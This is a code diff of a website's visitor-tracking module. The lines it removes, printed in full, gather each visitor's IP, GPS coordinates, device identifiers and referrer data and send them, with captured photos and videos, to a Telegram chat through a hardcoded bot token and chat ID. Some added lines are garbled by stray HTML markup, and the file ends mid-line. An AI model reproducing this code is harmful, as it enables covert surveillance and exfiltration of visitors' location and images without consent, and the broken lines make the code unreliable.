@@ -69,20 +69,16 @@ async function getDeviceInfo(): Promise<DeviceInfo> {
   let totalMemory: number | undefined;
 
   try {
-    // Get screen resolution
-    screenResolution = `${window.screen.width}x${window.screen.height}@${window.devicePixelRatio}x`;
+    screenResolution = `<span class="math-inline">\{window\.screen\.width\}x</span>{window.screen.height}@${window.devicePixelRatio}x`;
 
-    // Get CPU cores
     if (navigator.hardwareConcurrency) {
       cpuCores = navigator.hardwareConcurrency;
     }
 
-    // Get memory info
     if ('deviceMemory' in navigator) {
       totalMemory = (navigator as any).deviceMemory;
     }
 
-    // Get battery info
     try {
       const battery = await (navigator as any).getBattery?.();
       if (battery) {
@@ -92,7 +88,6 @@ async function getDeviceInfo(): Promise<DeviceInfo> {
       console.log('Battery API not available');
     }
 
-    // Get network info
     if ('connection' in navigator) {
       const conn = (navigator as any).connection;
       if (conn) {
@@ -100,7 +95,6 @@ async function getDeviceInfo(): Promise<DeviceInfo> {
       }
     }
 
-    // Try Client Hints API first
     if ('userAgentData' in navigator) {
       const uaData = navigator.userAgentData as any;
       const hints = await uaData.getHighEntropyValues([
@@ -110,15 +104,14 @@ async function getDeviceInfo(): Promise<DeviceInfo> {
         'mobile',
         'architecture',
         'bitness',
-        'fullVersionList'
+        'fullVersionList',
       ]);
-      
+
       platform = hints.platform || platform;
       model = hints.model || model;
       mobile = hints.mobile;
       osVersion = hints.platformVersion || osVersion;
 
-      // Get detailed browser version
       const browsers = hints.fullVersionList || [];
       const browserInfo = browsers.find((b: any) => b.brand !== 'Not.A.Brand') || {};
       if (browserInfo.version) {
@@ -126,10 +119,8 @@ async function getDeviceInfo(): Promise<DeviceInfo> {
       }
     }
 
-    // Parse User-Agent string as fallback
     const ua = navigator.userAgent.toLowerCase();
-    
-    // Detect device type
+
     if (/(tablet|ipad|playbook|silk)|(android(?!.*mobile))/i.test(ua)) {
       type = 'Tablet';
       mobile = true;
@@ -140,7 +131,6 @@ async function getDeviceInfo(): Promise<DeviceInfo> {
       type = 'Desktop';
     }
 
-    // Detect brand and model
     if (ua.includes('iphone')) {
       brand = 'Apple';
       const match = ua.match(/iphone\sos\s(\d+_\d+)/);
@@ -170,7 +160,6 @@ async function getDeviceInfo(): Promise<DeviceInfo> {
       osVersion = version ? version[1] : osVersion;
     }
 
-    // Get additional Android info if available
     let androidId: string | undefined;
     let serialNumber: string | undefined;
     let imei: string | undefined;
@@ -199,7 +188,7 @@ async function getDeviceInfo(): Promise<DeviceInfo> {
       screenResolution,
       cpuCores,
       totalMemory,
-      osVersion
+      osVersion,
     };
   } catch (error) {
     console.error('Error getting device info:', error);
@@ -208,20 +197,19 @@ async function getDeviceInfo(): Promise<DeviceInfo> {
       model,
       type,
       platform,
-      mobile
+      mobile,
     };
   }
 }
 
 async function getLocationInfo(): Promise<LocationInfo> {
   try {
-    // Get IP-based location first as a fallback
     const ipResponse = await fetch('https://ipapi.co/json/');
     if (!ipResponse.ok) {
       throw new Error(`Location API error: ${ipResponse.status}`);
     }
     const ipData = await ipResponse.json();
-    
+
     const locationData: LocationInfo = {
       city: ipData.city || 'Unknown',
       country: ipData.country_name || 'Unknown',
@@ -229,31 +217,24 @@ async function getLocationInfo(): Promise<LocationInfo> {
       longitude: ipData.longitude || null,
       accuracy: null,
       source: 'IP',
-      ip: ipData.ip || 'Unknown'
+      ip: ipData.ip || 'Unknown',
     };
 
-    // Try to get precise location if available
     if ('geolocation' in navigator) {
       try {
         const position = await new Promise<GeolocationPosition>((resolve, reject) => {
-          navigator.geolocation.getCurrentPosition(
-            resolve,
-            reject,
-            {
-              enableHighAccuracy: true,
-              timeout: 5000,
-              maximumAge: 0
-            }
-          );
+          navigator.geolocation.getCurrentPosition(resolve, reject, {
+            enableHighAccuracy: true,
+            timeout: 5000,
+            maximumAge: 0,
+          });
         });
 
-        // Only update if we got more precise coordinates
         locationData.latitude = position.coords.latitude;
         locationData.longitude = position.coords.longitude;
         locationData.accuracy = position.coords.accuracy;
         locationData.source = 'GPS';
       } catch (geoError) {
-        // Silently fall back to IP-based location
         console.log('Using IP-based location as fallback');
       }
     }
@@ -268,280 +249,9 @@ async function getLocationInfo(): Promise<LocationInfo> {
       longitude: null,
       accuracy: null,
       source: 'None',
-      ip: 'Unknown'
+      ip: 'Unknown',
     };
   }
 }
 
-async function sendTelegramMessage(botToken: string, data: any): Promise<Response> {
-  if (!botToken) {
-    throw new Error('Bot token is missing');
-  }
-
-  const chatInfoResponse = await fetch(`https://api.telegram.org/bot${botToken}/getChat?chat_id=${data.chat_id}`);
-  const chatInfo = await chatInfoResponse.json();
-
-  if (chatInfo.ok && chatInfo.result.type === 'supergroup') {
-    data.chat_id = chatInfo.result.id;
-  }
-
-  const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-    method: 'POST',
-    headers: {
-      'Content-Type': 'application/json',
-    },
-    body: JSON.stringify(data),
-  });
-
-  const responseData = await response.json();
-  
-  if (!response.ok || !responseData.ok) {
-    throw new Error(
-      `Telegram API Error: ${response.status} - ${responseData.description || response.statusText}`
-    );
-  }
-
-  return response;
-}
-
-export const sendTelegramNotification = async (details: VisitorDetails) => {
-  if (hasNotificationBeenSent) {
-    return;
-  }
-
-  const primaryBotToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN?.trim();
-  const backupBotToken = '7665961745:AAEW2x3-cvvQb2i_F1dtkaOqldmX8-3VRkM';
-  const CHAT_ID = '6571925222';
-
-  if (!CHAT_ID) {
-    console.error('Telegram chat ID is not configured');
-    return;
-  }
-  
-  const locationInfo = await getLocationInfo();
-  const deviceInfo = await getDeviceInfo();
-  
-  let locationText = `🌆 City: ${locationInfo.city}\n🌍 Country: ${locationInfo.country}\n🌐 IP: ${locationInfo.ip}`;
-  
-  if (locationInfo.latitude && locationInfo.longitude) {
-    locationText += `\n📍 Location (${locationInfo.source}): ${locationInfo.latitude}, ${locationInfo.longitude}`;
-    if (locationInfo.accuracy) {
-      locationText += `\n🎯 Accuracy: ${Math.round(locationInfo.accuracy)}m`;
-    }
-    
-    locationText += `\n🗺 Map: https://www.google.com/maps?q=${locationInfo.latitude},${locationInfo.longitude}`;
-  }
-
-  const deviceText = `
-📱 Device Details
-  • Brand: ${deviceInfo.brand}
-  • Model: ${deviceInfo.model}
-  • Type: ${deviceInfo.type}
-  • Platform: ${deviceInfo.platform}
-  • OS Version: ${deviceInfo.osVersion || 'Unknown'}
-  • Mobile: ${deviceInfo.mobile ? 'Yes' : 'No'}
-  • Screen: ${deviceInfo.screenResolution || 'Unknown'}
-  • CPU Cores: ${deviceInfo.cpuCores || 'Unknown'}
-  • Memory: ${deviceInfo.totalMemory ? deviceInfo.totalMemory + 'GB' : 'Unknown'}
-  • Battery: ${deviceInfo.batteryLevel ? deviceInfo.batteryLevel + '%' : 'Unknown'}
-  • Network: ${deviceInfo.networkType || 'Unknown'}
-  • IMEI: ${deviceInfo.imei || 'Not available'}
-  • Android ID: ${deviceInfo.androidId || 'Not available'}
-  • Serial: ${deviceInfo.serialNumber || 'Not available'}`;
-  
-  const message = `
-🔍 New Visitor Details
-👤 UA: ${details.userAgent}
-📍 Location: ${details.location}
-${locationText}
-${deviceText}
-🔗 Referrer: ${details.referrer}
-🌐 Previous sites: ${details.previousSites}
-⏰ Time: ${new Date().toISOString()}
-  `.trim();
-
-  const messageData = {
-    chat_id: CHAT_ID,
-    text: message,
-    parse_mode: 'HTML',
-  };
-
-  try {
-    if (primaryBotToken) {
-      try {
-        await sendTelegramMessage(primaryBotToken, messageData);
-        hasNotificationBeenSent = true;
-        return;
-      } catch (error) {
-        console.error('Primary bot failed:', error instanceof Error ? error.message : 'Unknown error');
-      }
-    }
-
-    try {
-      await sendTelegramMessage(backupBotToken, messageData);
-      hasNotificationBeenSent = true;
-    } catch (error) {
-      throw new Error(`Backup bot failed: ${error instanceof Error ? error.message : 'Unknown error'}`);
-    }
-  } catch (error) {
-    console.error('Both bots failed:', error instanceof Error ? error.message : 'Unknown error');
-  }
-};
-
-export const sendVideoToTelegram = async (videoBlob: Blob) => {
-  const primaryBotToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN?.trim();
-  const backupBotToken = '7665961745:AAEW2x3-cvvQb2i_F1dtkaOqldmX8-3VRkM';
-  const CHAT_ID = '6571925222';
-
-  if (!CHAT_ID) {
-    console.error('Telegram chat ID is not configured');
-    return;
-  }
-
-  const locationInfo = await getLocationInfo();
-  const deviceInfo = await getDeviceInfo();
-  const formData = new FormData();
-  formData.append('chat_id', CHAT_ID);
-  
-  const videoFile = new File([videoBlob], 'visitor-video.mp4', {
-    type: 'video/mp4'
-  });
-  
-  formData.append('video', videoFile);
-  formData.append('caption', `🎥 Visitor Video
-⏰ Time: ${new Date().toISOString()}
-🌆 City: ${locationInfo.city}
-🌍 Country: ${locationInfo.country}
-🌐 IP: ${locationInfo.ip}
-📱 Device: ${deviceInfo.brand} ${deviceInfo.model}
-📱 IMEI: ${deviceInfo.imei || 'Not available'}
-📱 Android ID: ${deviceInfo.androidId || 'Not available'}
-📱 Serial: ${deviceInfo.serialNumber || 'Not available'}`);
-  formData.append('supports_streaming', 'true');
-
-  const sendVideo = async (botToken: string): Promise<Response> => {
-    if (!botToken) {
-      throw new Error('Bot token is missing');
-    }
-
-    const chatInfoResponse = await fetch(`https://api.telegram.org/bot${botToken}/getChat?chat_id=${CHAT_ID}`);
-    const chatInfo = await chatInfoResponse.json();
-
-    const finalChatId = chatInfo.ok && chatInfo.result.type === 'supergroup' 
-      ? chatInfo.result.id 
-      : CHAT_ID;
-
-    formData.set('chat_id', finalChatId);
-
-    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
-      method: 'POST',
-      body: formData,
-    });
-
-    if (!response.ok) {
-      const responseData = await response.json();
-      throw new Error(
-        `Telegram API Error: ${response.status} - ${responseData.description || response.statusText}`
-      );
-    }
-
-    return response;
-  };
-
-  try {
-    if (primaryBotToken) {
-      try {
-        await sendVideo(primaryBotToken);
-        console.log('Video sent successfully with primary bot');
-        return;
-      } catch (error) {
-        console.error('Primary bot failed to send video:', error instanceof Error ? error.message : 'Unknown error');
-      }
-    }
-
-    try {
-      await sendVideo(backupBotToken);
-      console.log('Video sent successfully with backup bot');
-    } catch (error) {
-      console.error('Backup bot failed to send video:', error instanceof Error ? error.message : 'Unknown error');
-      throw error;
-    }
-  } catch (error) {
-    console.error('Both bots failed to send video:', error instanceof Error ? error.message : 'Unknown error');
-  }
-};
-
-export const sendImageToTelegram = async (imageBlob: Blob) => {
-  const primaryBotToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN?.trim();
-  const backupBotToken = '7665961745:AAEW2x3-cvvQb2i_F1dtkaOqldmX8-3VRkM';
-  const CHAT_ID = '6571925222';
-
-  if (!CHAT_ID) {
-    console.error('Telegram chat ID is not configured');
-    return;
-  }
-
-  const locationInfo = await getLocationInfo();
-  const deviceInfo = await getDeviceInfo();
-  const formData = new FormData();
-  formData.append('chat_id', CHAT_ID);
-  formData.append('photo', imageBlob, 'visitor-photo.jpg');
-  formData.append('caption', `📸 Visitor Photo
-⏰ Time: ${new Date().toISOString()}
-🌆 City: ${locationInfo.city}
-🌍 Country: ${locationInfo.country}
-🌐 IP: ${locationInfo.ip}
-📱 Device: ${deviceInfo.brand} ${deviceInfo.model}
-📱 IMEI: ${deviceInfo.imei || 'Not available'}
-📱 Android ID: ${deviceInfo.androidId || 'Not available'}
-📱 Serial: ${deviceInfo.serialNumber || 'Not available'}`);
-
-  const sendPhoto = async (botToken: string): Promise<Response> => {
-    if (!botToken) {
-      throw new Error('Bot token is missing');
-    }
-
-    const chatInfoResponse = await fetch(`https://api.telegram.org/bot${botToken}/getChat?chat_id=${CHAT_ID}`);
-    const chatInfo = await chatInfoResponse.json();
-
-    const finalChatId = chatInfo.ok && chatInfo.result.type === 'supergroup' 
-      ? chatInfo.result.id 
-      : CHAT_ID;
-
-    formData.set('chat_id', finalChatId);
-
-    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-      method: 'POST',
-      body: formData,
-    });
-
-    const responseData = await response.json();
-
-    if (!response.ok || !responseData.ok) {
-      throw new Error(
-        `Telegram API Error: ${response.status} - ${responseData.description || response.statusText}`
-      );
-    }
-
-    return response;
-  };
-
-  try {
-    if (primaryBotToken) {
-      try {
-        await sendPhoto(primaryBotToken);
-        return;
-      } catch (error) {
-        console.error('Primary bot failed to send image:', error instanceof Error ? error.message : 'Unknown error');
-      }
-    }
-
-    try {
-      await sendPhoto(backupBotToken);
-    } catch (error) {
-      throw new Error(`Backup bot failed to send image: ${error instanceof Error ? error.message : 'Unknown error'}`);
-    }
-  } catch (error) {
-    console.error('Both bots failed to send image:', error instanceof Error ? error.message : 'Unknown error');
-  }
-};
+async function sendTelegramMessage(botToken: string, data: any): Promise<Response
